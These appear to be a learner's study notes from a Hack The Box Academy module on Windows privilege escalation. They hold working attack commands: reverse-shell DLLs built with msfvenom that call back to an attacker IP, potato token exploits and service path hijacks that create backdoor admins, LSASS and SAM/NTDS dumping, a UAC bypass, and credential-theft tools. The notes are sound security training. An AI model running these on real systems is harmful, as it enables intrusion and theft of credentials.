# Windows Privilege Escalation

**Platform:** Hack The Box Academy  
**Module:** Windows Privilege Escalation  
**Sections:** 33  
**Difficulty:** Medium  
**Category:** Offensive Security / Post-Exploitation  
**Goal:** Penetration Tester role in India | Target: January 2027

---

## Table of Contents

1. [Overview](#overview)
2. [Why Privilege Escalation Matters](#why-privilege-escalation-matters)
3. [Enumeration Tools](#enumeration-tools)
4. [Situational Awareness](#situational-awareness)
5. [Windows User Privileges](#windows-user-privileges)
   - [SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege](#seimpersonateprivilege--seassignprimarytokenprivilege)
   - [SeDebugPrivilege](#sedebugprivilege)
   - [SeTakeOwnershipPrivilege](#setakeownershipprivilege)
6. [Windows Built-in Groups](#windows-built-in-groups)
   - [Backup Operators](#backup-operators)
   - [Event Log Readers](#event-log-readers)
   - [DnsAdmins](#dnsadmins)
   - [Hyper-V Administrators](#hyper-v-administrators)
   - [Print Operators](#print-operators)
   - [Server Operators](#server-operators)
7. [User Account Control (UAC) Bypass](#user-account-control-uac-bypass)
8. [Weak Service and File Permissions](#weak-service-and-file-permissions)
   - [Permissive File System ACLs](#permissive-file-system-acls)
   - [Weak Service Permissions](#weak-service-permissions)
   - [Unquoted Service Path](#unquoted-service-path)
9. [Credential Hunting](#credential-hunting)
   - [Application Credential Storage](#application-credential-storage)
   - [Further Credential Theft](#further-credential-theft)
10. [Additional Techniques](#additional-techniques)
    - [Scheduled Tasks](#scheduled-tasks)
    - [Vulnerable Services](#vulnerable-services)
    - [DLL Injection](#dll-injection)
    - [LOLBAS](#lolbas)
11. [Legacy Operating Systems](#legacy-operating-systems)
12. [Hardening & Mitigations](#hardening--mitigations)
13. [Key Tools Reference](#key-tools-reference)
14. [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Overview

After gaining a foothold on a Windows system, privilege escalation is typically the next critical step. The goal is to elevate access to either **Local Administrator** or **NT AUTHORITY\SYSTEM** — or in some cases, to another user whose access satisfies the assessment objective.

Privilege escalation serves multiple purposes across different engagement types:

| Scenario | Purpose |
|----------|----------|
| Gold image / workstation breakout | Primary assessment goal |
| Local resource access (databases, files) | Unlock restricted data |
| Domain-joined machine → AD foothold | Gain SYSTEM to harvest Kerberos tickets or hashes |
| Credential theft | Enable lateral movement through the network |

Understanding manual enumeration methods is essential. Situations arise where tools cannot be loaded — air-gapped networks, blocked USB ports, heavily firewalled hosts — requiring solid command-line knowledge using PowerShell and CMD.

---

## Why Privilege Escalation Matters

Common root causes that introduce privilege escalation vulnerabilities:

- **Personnel constraints** — insufficient staff to manage patching and vulnerability management
- **Budget limitations** — older systems, deferred upgrades, no periodic assessments
- **Misconfigurations** — weak ACLs on services/files, unquoted paths, excessive group memberships
- **Credential exposure** — passwords stored in scripts, config files, or memory

### Real-World Scenarios

**Scenario 1 — Overcoming Network Restrictions**  
No internet, blocked USB, NAC on the user VLAN. Found a printer VLAN with outbound access on ports 80/443/445. Used manual enumeration to find a permissions flaw, performed a manual LSASS memory dump, exfiltrated the dump over SMB to an attack machine on the printer VLAN, and cracked the Domain Admin NTLM hash offline with Mimikatz.

**Scenario 2 — Pillaging Open Shares**  
Locked-down environment with no obvious vulnerabilities. Found a wide-open share hosting `.VMDK` and `.VHDX` VM backup files. Mounted the virtual hard drive, extracted SAM/SYSTEM/SECURITY registry hives, and used `secretsdump.py` to recover the local administrator hash. The org used a gold image — the single hash provided pass-the-hash access across nearly every Windows system.

**Scenario 3 — Hunting Credentials and Abusing Account Privileges**  
Used **Snaffler** to hunt shares for sensitive files. Found `.sql` files containing low-privileged database credentials. Connected to MSSQL, enabled `xp_cmdshell`, confirmed **SeImpersonatePrivilege** on the service account, deployed Juicy Potato, and added a local admin user.

---

## Enumeration Tools

| Tool | Type | Purpose |
|------|------|----------|
| **winPEAS** | Script | Comprehensive Windows privesc enumeration |
| **Seatbelt** | C# binary | Wide range of local privilege escalation checks |
| **PowerUp** | PowerShell | Misconfiguration-based privesc checks; can exploit findings |
| **SharpUp** | C# binary | C# port of PowerUp |
| **JAWS** | PowerShell | Privesc enumeration written in PS 2.0 (older systems) |
| **Watson** | .NET binary | Enumerates missing KBs and suggests CVE-based exploits |
| **WES-NG** | Python | `systeminfo` output → list of applicable CVEs |
| **LaZagne** | Binary | Recovers stored credentials from browsers, apps, memory |
| **SessionGopher** | PowerShell | Extracts saved sessions: PuTTY, WinSCP, RDP, FileZilla |
| **Sherlock** | PowerShell | Missing patch enumeration on legacy systems |
| **Snaffler** | C# binary | File share credential and sensitive data hunting |
| **AccessChk** | Sysinternals | Audit effective permissions on services, files, registry |
| **ProcDump** | Sysinternals | Process memory dump (LSASS) |

> **Note:** Most of these tools are detected by AV/EDR. Always upload to `C:\Windows\Temp` — the `BUILTIN\Users` group has write access there.

---

## Situational Awareness

Before escalating, orient yourself on the target system.

### Network Enumeration

```cmd
# Interface, IP, DNS
C:\htb> ipconfig /all

# Routing table
C:\htb> route print

# ARP cache — identify other hosts the system communicates with
C:\htb> arp -a
```

Dual-homed hosts can unlock access to previously unreachable network segments. The ARP cache reveals hosts the target communicates with — useful for lateral movement planning after escalation.

### System Information

```cmd
# OS version, hostname, installed hotfixes
C:\htb> systeminfo

# Running processes
C:\htb> tasklist /svc

# Installed software (32-bit and 64-bit)
C:\htb> wmic product get name

# Scheduled tasks
C:\htb> schtasks /query /fo LIST /v
```

### User and Group Enumeration

```cmd
# Current user and SID
C:\htb> whoami /all

# Current privileges
C:\htb> whoami /priv

# Local users
C:\htb> net user

# Local groups
C:\htb> net localgroup

# Group membership
C:\htb> net localgroup administrators
```

### Named Pipes

```cmd
# List named pipes
C:\htb> pipelist.exe /accepteula

# Enumerate named pipe permissions with AccessChk
C:\htb> accesschk.exe /accepteula \\.\Pipe\lsass -v
```

---

## Windows User Privileges

Certain Windows privileges, when assigned to a user or service account, can be directly abused for local privilege escalation. Use `whoami /priv` to enumerate assigned privileges.

---

### SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege

Granted by default to service accounts. Allows a process to impersonate a client after authentication. Abused via token impersonation attacks.

**Tools:** JuicyPotato, RoguePotato, PrintSpoofer, GodPotato (depending on OS version)

```cmd
# Confirm privilege
C:\htb> whoami /priv
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled

# PrintSpoofer — modern replacement for JuicyPotato on Windows 10 / Server 2016+
C:\htb> PrintSpoofer.exe -i -c cmd

# JuicyPotato — Windows Server 2008/2012/2016 targets
C:\htb> JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c net user backdoor Password123! /add" -t *
C:\htb> JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c net localgroup administrators backdoor /add" -t *
```

> **Key concept:** Services running under `NT AUTHORITY\NETWORK SERVICE` or `LOCAL SERVICE` almost always have this privilege. SQL Server, IIS app pools, and custom service accounts are common targets.

---

### SeDebugPrivilege

Allows a user to debug any process on the system, including SYSTEM-level processes. Rarely assigned to non-admin accounts but occasionally seen on service accounts or developer workstations.

**Attack 1 — LSASS Memory Dump**

```cmd
# Dump LSASS process memory using ProcDump
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Parse the dump offline with Mimikatz
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

LSASS can also be dumped via Task Manager → Details tab → right-click `lsass.exe` → Create dump file.

**Attack 2 — RCE as SYSTEM via Parent Process Impersonation**

```powershell
# Get a list of SYSTEM processes to target
PS C:\htb> tasklist

# Use psgetsystem PoC — spawn a child process inheriting SYSTEM token
# Target winlogon.exe (always runs as SYSTEM, PID varies)
PS C:\htb> [MyProcess]::CreateProcessFromParent(<system_pid>, "cmd.exe", "")

# Or pass LSASS PID directly using Get-Process
PS C:\htb> Get-Process lsass
```

---

### SeTakeOwnershipPrivilege

Grants the ability to take ownership of any securable object — files, folders, registry keys, AD objects, services, and processes. Assigns `WRITE_OWNER` rights over the target object.

```powershell
# Check current privileges
PS C:\htb> whoami /priv

# Enable the privilege if disabled
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1

# Take ownership of a target file
PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'

# Confirm ownership changed
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

# Grant full access to read the file
PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

# Read the file
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'
```

> **Target files of interest:** `web.config`, `%WINDIR%\repair\sam`, `%WINDIR%\repair\system`, SAM/SECURITY/SYSTEM hives, `.kdbx` databases, SSH keys, scripts containing credentials.

---

## Windows Built-in Groups

Membership in certain built-in groups grants privileges that can be abused for escalation without being a direct administrator.

---

### Backup Operators

Members inherit `SeBackupPrivilege` and `SeRestorePrivilege` — the ability to read and write any file regardless of ACLs, provided the `FILE_FLAG_BACKUP_SEMANTICS` flag is used.

**Attack — Extract SAM/SYSTEM registry hives and dump local hashes**

```powershell
# Import SeBackupPrivilege libraries
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll

# Enable the privilege
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege

# Copy SAM and SYSTEM registry hives
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Windows\System32\config\sam' .\sam
PS C:\htb> Copy-FileSeBackupPrivilege 'C:\Windows\System32\config\system' .\system

# Dump hashes offline
$ secretsdump.py LOCAL -sam sam -system system
```

On a Domain Controller, this privilege can be used to perform a full NTDS.dit extraction, which contains all domain hashes.

---

### Event Log Readers

Members can read Security event logs. Can reveal cleartext credentials passed on the command line (Event ID 4688 — process creation with full command line logging enabled).

```powershell
# Confirm group membership
PS C:\htb> net localgroup "Event Log Readers"

# Search Security log for credential-containing command lines
PS C:\htb> wevtutil qe Security /rd:true /f:text | Select-String "/user"

# Use Get-WinEvent with a credential filter
PS C:\htb> Get-WinEvent -LogName security | where { $_.Id -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

---

### DnsAdmins

Members can load arbitrary DLLs into the DNS service (`dns.exe`), which runs as `NT AUTHORITY\SYSTEM`.

```cmd
# Generate malicious DLL
$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

# Register the DLL as the DNS plugin
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

# Restart the DNS service to trigger DLL load
C:\htb> sc stop dns
C:\htb> sc start dns

# Confirm domain admin group membership
C:\htb> net group "Domain Admins" /dom
```

> **Cleanup:** Remove the plugin DLL registry key after exploitation. Leaving it will break DNS on every restart.

---

### Hyper-V Administrators

Members have full control over all Virtual Machines. If a Domain Controller is virtualized, this group provides a path to DC compromise via virtual disk extraction.

- Mount the DC's `.VHDX` file to extract the NTDS.dit and SYSTEM hive
- Use `secretsdump.py` to dump all domain hashes offline

---

### Print Operators

Members are granted `SeLoadDriverPrivilege`, allowing them to load and unload kernel drivers — a powerful vector for SYSTEM escalation via a vulnerable kernel driver.

```powershell
# Enable SeLoadDriverPrivilege (usually disabled by default)
PS C:\htb> Import-Module .\SeLoadDriverPrivilege.ps1
PS C:\htb> Add-SeLoadDriverPrivilege

# Load a vulnerable driver (e.g., Capcom.sys)
# Use EoPLoadDriver to register and load the driver
PS C:\htb> .\EoPLoadDriver.exe System\CurrentControlSet\MyService \?\C:\Users\<user>\Desktop\Capcom.sys

# Exploit the vulnerable driver for SYSTEM
PS C:\htb> .\ExploitCapcom.exe
```

---

### Server Operators

Members can start/stop services and modify service binaries — a direct path to SYSTEM.

```cmd
# Confirm group membership
C:\htb> net localgroup "Server Operators"

# Query an existing SYSTEM service
C:\htb> sc qc AppReadiness

# Modify the binary path to execute a command as SYSTEM
C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

# Start the service to trigger execution
C:\htb> sc start AppReadiness
```

---

## User Account Control (UAC) Bypass

UAC prevents unauthorized changes by prompting for elevation. Even admin accounts operate with a filtered standard token until elevation is confirmed.

### Checking UAC Status

```cmd
# Confirm UAC is enabled
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

# Check UAC consent level (0x5 = Always Notify — highest)
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

# Check Windows build version (required to select the right bypass technique)
PS C:\htb> [environment]::OSVersion.Version
```

### UAC Bypass via DLL Hijacking (UACME Technique #54)

Targets the auto-elevating binary `SystemPropertiesAdvanced.exe` (32-bit), which attempts to load the non-existent `srrstr.dll` from user-writable paths in `%PATH%`.

```powershell
# Check the PATH variable for writable directories
PS C:\htb> cmd /c echo %PATH%
# WindowsApps directory is writable by the current user

# Generate malicious DLL on attack host
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

# Serve the DLL
$ sudo python3 -m http.server 8080

# Download to the WindowsApps folder on target
PS C:\htb> curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

# Start listener
$ nc -lvnp 8443

# Trigger the auto-elevating binary
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

The DLL loads in an elevated context, returning a shell with full admin privileges — UAC bypassed.

> **Reference:** The [UACME project](https://github.com/hfiref0x/UACME) maintains a comprehensive list of UAC bypasses indexed by Windows build number.

---

## Weak Service and File Permissions

Windows services typically run as SYSTEM. Misconfigured permissions on service binaries or the service configuration itself are a reliable escalation path.

---

### Permissive File System ACLs

If a service binary's directory grants write access to low-privileged users, the binary can be replaced with a malicious one.

```powershell
# Identify vulnerable service binaries with SharpUp
PS C:\htb> .\SharpUp.exe audit

# Verify permissions with icacls
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
# Output: BUILTIN\Users:(I)(F)  Everyone:(I)(F)  — full control for all users

# Replace the binary and start the service
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```

---

### Weak Service Permissions

If a user has `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG` rights on a service, the binary path can be redirected to execute arbitrary commands.

```cmd
# Identify misconfigured services with SharpUp
C:\htb> SharpUp.exe audit

# Verify permissions with AccessChk
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
# Output: RW NT AUTHORITY\Authenticated Users  SERVICE_ALL_ACCESS

# Modify the binary path to add our user to local admins
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

# Stop and restart the service to execute the command
C:\htb> sc stop WindscribeService
C:\htb> sc start WindscribeService

# Confirm local admin membership
C:\htb> net localgroup administrators

# Restore the original binary path (cleanup)
C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
C:\htb> sc start WindScribeService
```

> **Note:** `CVE-2019-1322` (Windows Update Orchestrator Service UsoSvc) exploited this exact vector — weak permissions on a SYSTEM service allowed service accounts to hijack the binary path.

---

### Unquoted Service Path

When a service binary path contains spaces and is not enclosed in quotes, Windows parses it ambiguously and may execute a binary placed in a parent directory.

```
Service path: C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe

Windows tries in order:
  C:\Program.exe
  C:\Program Files.exe
  C:\Program Files (x86)\System.exe          <-- attacker-placed binary
  C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

```cmd
# Query service for unquoted path
C:\htb> sc qc SystemExplorerHelpService
# BINARY_PATH_NAME: C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe  (no quotes)

# Check write permissions on the parent directory
C:\htb> icacls "C:\Program Files (x86)\System Explorer"

# Place malicious binary at the hijack point
C:\htb> copy malicious.exe "C:\Program Files (x86)\System.exe"

# Restart the service
C:\htb> sc stop SystemExplorerHelpService
C:\htb> sc start SystemExplorerHelpService
```

---

## Credential Hunting

Credentials stored locally are a primary escalation and lateral movement enabler.

---

### Application Credential Storage

**Windows AutoLogon Registry Keys**

```cmd
C:\htb> REG QUERY "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
# DefaultUserName, DefaultPassword stored in plaintext
```

**Putty Saved Sessions**

```cmd
C:\htb> REG QUERY HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions /f "Proxy" /s
# ProxyUsername, ProxyPassword stored per session
```

**Configuration Files — IIS**

```powershell
PS C:\htb> Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
PS C:\htb> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

**Unattended Installation Files**

```cmd
C:\htb> type C:\Windows\Panther\Unattend.xml
# Credentials may be base64-encoded under <Password> or <AdministratorPassword>
```

**PowerShell History**

```powershell
PS C:\htb> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Sticky Notes**

```powershell
# Query the SQLite database directly
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
PS C:\htb> Import-Module .\PSSQLite.psd1
PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

**WiFi Passwords**

```cmd
C:\htb> netsh wlan show profile
C:\htb> netsh wlan show profile <SSID> key=clear
```

---

### Further Credential Theft

**Saved Credentials (cmdkey)**

```cmd
C:\htb> cmdkey /list
# Reveals stored credentials for RDP or other connections

# Use saved credentials to run commands as another user
PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

**Browser Credentials**

```powershell
# Extract Chrome saved logins with SharpChrome
PS C:\htb> .\SharpChrome.exe logins /unprotect
```

**KeePass Database**

```bash
# Extract hash with keepass2john
$ python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx

# Crack the hash with Hashcat (mode 13400 = KeePass)
$ hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt
```

**LaZagne — Bulk Credential Recovery**

```powershell
# Run all modules
PS C:\htb> .\lazagne.exe all

# Run specific module
PS C:\htb> .\lazagne.exe browsers
PS C:\htb> .\lazagne.exe databases
```

**User/Computer Description Fields**

```powershell
# Check local user descriptions
PS C:\htb> Get-LocalUser

# Check computer description
PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description
```

**Mount VHDX/VMDK for Offline Hash Extraction**

```bash
# Mount VMDK on Linux
$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

# Mount VHDX on Linux
$ guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1

# Extract hashes from registry hives
$ secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

---

## Additional Techniques

### Scheduled Tasks

```cmd
# Enumerate scheduled tasks — look for non-standard tasks running as SYSTEM
C:\htb> schtasks /query /fo LIST /v | findstr /b "Task To Run\|Run As User"

# Check permissions on script files used by SYSTEM tasks
C:\htb> icacls C:\Scripts\backup.ps1
# If writable by low-privileged users — inject a reverse shell or admin creation command
```

---

### Vulnerable Services

```cmd
# Search for vulnerable services using WES-NG
$ systeminfo > systeminfo.txt
$ wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only

# Check installed hotfixes manually
C:\htb> wmic qfe
```

---

### DLL Injection

When a privileged process or auto-elevating binary attempts to load a DLL that doesn't exist, and the search path includes a user-writable directory, a malicious DLL can be planted to execute code in that process's context.

**DLL Search Order (Windows):**
1. Directory of the application
2. `C:\Windows\System32`
3. `C:\Windows\System`
4. `C:\Windows`
5. Directories in the `PATH` environment variable

```powershell
# Identify missing DLLs with ProcMon (filter: NAME NOT FOUND + .dll)
# Check writable PATH directories
PS C:\htb> cmd /c echo %PATH%

# Generate payload DLL
$ msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll > payload.dll

# Place in the writable PATH directory
PS C:\htb> copy payload.dll "C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\target.dll"
```

---

### LOLBAS

Living Off the Land Binaries and Scripts — native Windows binaries that can be abused for privilege escalation, persistence, or defense evasion.

```powershell
# List writable directories in system paths
PS C:\htb> $env:Path -split ";" | Get-Acl | Where-Object { $_.AccessToString -match "Everyone Allow.*Write" }

# Common LOLBAS targets for execution/bypass:
# certutil.exe  — download files
# mshta.exe     — execute HTA files
# regsvr32.exe  — execute COM scriptlets
# rundll32.exe  — execute DLL exports
# wscript.exe   — execute VBS/JS
```

---

## Legacy Operating Systems

Legacy systems (Server 2003/2008, Windows 7) lack modern mitigations — Credential Guard, Device Guard, enhanced Windows Defender — and are frequently missing years of patches.

### Key Differences by OS Version

| Feature | Server 2008 R2 | Server 2012 R2 | Server 2016 | Server 2019 |
|---------|---------------|----------------|-------------|-------------|
| Windows Defender ATP | | | | ✓ |
| Credential Guard | | | ✓ | ✓ |
| Device Guard | | | ✓ | ✓ |
| AppLocker | Partial | ✓ | ✓ | ✓ |
| Control Flow Guard | | | ✓ | ✓ |

### Enumerating Missing Patches on Legacy Systems

```powershell
# Check installed KBs via WMI
C:\htb> wmic qfe

# Run Sherlock to identify missing patches
PS C:\htb> Set-ExecutionPolicy bypass -Scope process
PS C:\htb> Import-Module .\Sherlock.ps1
PS C:\htb> Find-AllVulns
```

### Exploiting Server 2008 — MS10-092 (Task Scheduler XML)

```bash
# Deliver Meterpreter via SMB
msf6> use exploit/windows/smb/smb_delivery
msf6> set target 0
msf6> exploit
# Run the generated rundll32 command on target

# Migrate to a 64-bit process in Meterpreter
meterpreter> migrate <x64_pid>

# Use the local privilege escalation module
msf6> use exploit/windows/local/ms10_092_schelevator
msf6> set SESSION 1
msf6> run
```

---

## Hardening & Mitigations

| Category | Recommendation |
|----------|---------------|
| **Patching** | Maintain current patch levels; use WSUS or SCCM for automated deployment |
| **Services** | Audit service ACLs; never grant `SERVICE_ALL_ACCESS` to standard users; quote all binary paths |
| **File Permissions** | Audit world-writable directories in system paths; restrict write access on service binary directories |
| **User Accounts** | Enforce least privilege; audit group memberships; enforce strong passwords + MFA |
| **Credentials** | Never store credentials in plaintext scripts, config files, or description fields |
| **UAC** | Set ConsentPromptBehaviorAdmin to `0x5` (Always Notify); enforce from Group Policy |
| **Logging** | Deploy Sysmon; enable process creation logging (Event ID 4688) with command line auditing |
| **Auditing** | Use DISA STIGs or Microsoft Security Compliance Toolkit as baseline; run periodic assessments |
| **Encryption** | Enable BitLocker on all workstations and servers |
| **Virtualization** | Restrict membership in Hyper-V Administrators; audit VM file share access |

### Key Registry Locations

```
UAC Status:              HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA
UAC Level:               HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin
AutoLogon Creds:         HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon
Always Install Elevated: HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
                         HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

---

## Key Tools Reference

| Command | Purpose |
|---------|----------|
| `whoami /priv` | List assigned privileges for current user |
| `whoami /groups` | List group memberships |
| `whoami /all` | Full token information |
| `ipconfig /all` | Network interfaces and DNS config |
| `arp -a` | ARP cache — recently contacted hosts |
| `route print` | Routing table |
| `net localgroup administrators` | Local admin group membership |
| `tasklist /svc` | Running processes with associated services |
| `schtasks /query /fo LIST /v` | Scheduled task enumeration |
| `wmic qfe` | Installed hotfixes and patch level |
| `sc qc <service>` | Service configuration (binary path, start type) |
| `sc config <service> binpath=<cmd>` | Modify service binary path |
| `accesschk.exe /accepteula -quvcw <service>` | Audit service permissions |
| `icacls <path>` | Enumerate file/directory ACLs |
| `takeown /f <file>` | Take ownership of a file |
| `cmdkey /list` | List stored credentials |
| `runas /savecred /user:<user> <cmd>` | Execute command using saved credentials |
| `reg query <key>` | Query registry values |
| `procdump.exe -ma lsass.exe lsass.dmp` | Dump LSASS process memory |
| `secretsdump.py LOCAL -sam SAM -system SYSTEM` | Extract hashes from registry hives |
| `hashcat -m 13400 <hash> rockyou.txt` | Crack KeePass master password |
| `guestmount -a <vmdk> -i --ro /mnt/vmdk` | Mount VMDK on Linux |

---

## MITRE ATT&CK Mapping

| Technique | Sub-Technique | Description |
|-----------|---------------|-------------|
| T1134 | T1134.001 | Token Impersonation/Theft (SeImpersonatePrivilege → Juicy/PrintSpoofer) |
| T1134 | T1134.002 | Create Process with Token (SeDebugPrivilege → psgetsystem) |
| T1055 | T1055.001 | DLL Injection |
| T1574 | T1574.001 | Hijack Execution Flow: DLL Search Order Hijacking |
| T1574 | T1574.005 | Executable Installer File Permissions Weakness |
| T1574 | T1574.009 | Unquoted Service Path |
| T1574 | T1574.010 | Services File Permissions Weakness (weak service binary ACL) |
| T1574 | T1574.011 | Services Registry Permissions Weakness (weak service config ACL) |
| T1548 | T1548.002 | Abuse Elevation Control Mechanism: Bypass UAC |
| T1547 | T1547.001 | Boot or Logon Autostart: Registry Run Keys |
| T1053 | T1053.005 | Scheduled Task/Job: Scheduled Task |
| T1003 | T1003.001 | OS Credential Dumping: LSASS Memory |
| T1003 | T1003.002 | OS Credential Dumping: SAM |
| T1003 | T1003.003 | OS Credential Dumping: NTDS (via Backup Operators) |
| T1552 | T1552.001 | Unsecured Credentials: Credentials In Files |
| T1552 | T1552.002 | Unsecured Credentials: Credentials in Registry |
| T1555 | T1555.003 | Credentials from Password Stores: Credentials from Web Browsers |
| T1543 | T1543.003 | Create or Modify System Process: Windows Service |

---

*Module completed as part of the HTB Academy CPTS path.*  
*Penetration Tester role in India | Target: January 2027*
